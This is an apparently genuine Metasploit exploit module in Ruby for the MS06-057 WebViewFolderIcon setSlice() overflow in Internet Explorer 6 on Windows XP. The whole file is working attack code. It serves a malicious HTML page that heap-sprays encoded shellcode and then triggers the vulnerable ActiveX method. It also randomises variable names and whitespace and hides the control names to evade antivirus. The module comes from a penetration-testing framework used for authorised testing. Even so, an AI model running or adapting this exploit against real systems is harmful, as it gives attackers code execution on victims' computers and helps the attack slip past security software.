##
# $Id: ms06_057_webview_setslice.rb 9669 2010-07-03 03:13:45Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Internet Explorer WebViewFolderIcon setSlice() Overflow',
			'Description'    => %q{
				This module exploits a flaw in the WebViewFolderIcon ActiveX control
			included with Windows 2000, Windows XP, and Windows 2003. This flaw was published
			during the Month of Browser Bugs project (MoBB #18).
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'hdm',
				],
			'Version'        => '$Revision: 9669 $',
			'References'     =>
				[
					[ 'CVE', '2006-3730'],
					[ 'OSVDB', '27110' ],
					[ 'MSB', 'MS06-057'],
					[ 'BID', '19030' ],
					[ 'URL', 'http://browserfun.blogspot.com/2006/07/mobb-18-webviewfoldericon-setslice.html' ]
				],
			'Payload'        =>
				{
					'Space'          => 1024,
					'BadChars'       => "\x00",

				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['Windows XP SP0-SP2 / IE 6.0SP1 English', {'Ret' => 0x0c0c0c0c} ]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jul 17 2006'))
	end

	def on_request_uri(cli, request)

		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Encode the shellcode
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# Get a unicode friendly version of the return address
		addr_word  = [target.ret].pack('V').unpack('H*')[0][0,4]

		# Randomize the javascript variable names
		var_buffer    = rand_text_alpha(rand(30)+2)
		var_shellcode = rand_text_alpha(rand(30)+2)
		var_unescape  = rand_text_alpha(rand(30)+2)
		var_x         = rand_text_alpha(rand(30)+2)
		var_i         = rand_text_alpha(rand(30)+2)
		var_tic       = rand_text_alpha(rand(30)+2)
		var_toc       = rand_text_alpha(rand(30)+2)

		# Annoying AVs
		var_aname     = "==QMu42bjlkclRGbvZ0dllmViV2Vu42bjlkclRGbvZ0dllmViV2V".reverse.unpack("m*")[0]
		var_ameth     = "=U2Ypx2U0V2c".reverse.unpack("m*")[0]

		# Randomize HTML data
		html          = rand_text_alpha(rand(30)+2)


		# Build out the message
		content = %Q|
<html>
<head>
	<script>
	try {

	var #{var_unescape}  = unescape ;
	var #{var_shellcode} = #{var_unescape}( "#{shellcode}" ) ;

	var #{var_buffer} = #{var_unescape}( "%u#{addr_word}" ) ;
	while (#{var_buffer}.length <= 0x100000) #{var_buffer}+=#{var_buffer} ;

	var #{var_x} = new Array() ;
	for ( var #{var_i} =0 ; #{var_i} < 120 ; #{var_i}++ ) {
		#{var_x}[ #{var_i} ] =
			#{var_buffer}.substring( 0 ,  0x100000 - #{var_shellcode}.length ) + #{var_shellcode} ;
	}


	for ( var #{var_i} = 0 ; #{var_i} < 1024 ; #{var_i}++) {
		var #{var_tic} = new ActiveXObject( '#{var_aname}' );
		try { #{var_tic}.#{var_ameth}( 0x7ffffffe , 0 , 0 , #{target.ret} ) ; } catch( e ) { }
		var #{var_toc} = new ActiveXObject( '#{var_aname}' );
	}

	} catch( e ) { window.location = 'about:blank' ; }

	</script>
</head>
<body>
#{html}
</body>
</html>
		|

		content = Rex::Text.randomize_space(content)

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end
